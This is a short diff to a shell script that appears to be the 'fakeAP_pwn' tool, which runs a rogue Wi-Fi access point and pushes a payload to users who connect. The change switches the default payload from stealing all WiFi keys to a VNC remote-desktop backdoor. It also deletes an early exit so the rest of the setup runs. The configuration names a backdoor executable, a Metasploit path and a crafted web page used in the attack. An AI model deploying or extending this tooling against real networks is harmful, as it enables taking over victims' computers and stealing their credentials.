@@ -39,7 +39,7 @@ export    fakeAPchannel=6                            # Channel for the FakeAP
 export        interface=eth0                         # The interface you use to surf the internet (Use ifconfig!)
 export    wifiInterface=wlan0                        # The interface you want to use for the fake AP (must support monitor mode!) (Use iwconfig!)
 export monitorInterface=mon0                         # The interface airmon-ng creates (Use ifconfig!)
-export          payload=wkv                          # sbd/vnc/wkv/other - What to upload to the user. vnc=remote desktop, sbd=cmd line, wkv=Steal all WiFi keys
+export          payload=vnc                          # sbd/vnc/wkv/other - What to upload to the user. vnc=remote desktop, sbd=cmd line, wkv=Steal all WiFi keys
 export     backdoorPath=/root/backdoor.exe           # ...Only used when payload is set to "other"
 export   metasploitPath=/pentest/exploits/framework3 # Metasploit directory. No trailing slash.
 export       htdocsPath=/var/www/fakeAP_pwn          # The directory location to the crafted web page. No trailing slash.
@@ -534,8 +534,6 @@ echo "
 print_line(\"[*] Done!\")" >> /tmp/fakeAP_pwn.rb
 if [ "$verbose" == "2" ] ; then echo "[i] Created: /tmp/fakeAP_pwn.rb"; fi
 if [ "$debug" == "true" ]; then cat /tmp/fakeAP_pwn.rb ; fi
-
-exit
 
 # dhcpd script
 if test -e /tmp/fakeAP_pwn.dhcp; then rm /tmp/fakeAP_pwn.dhcp; fi
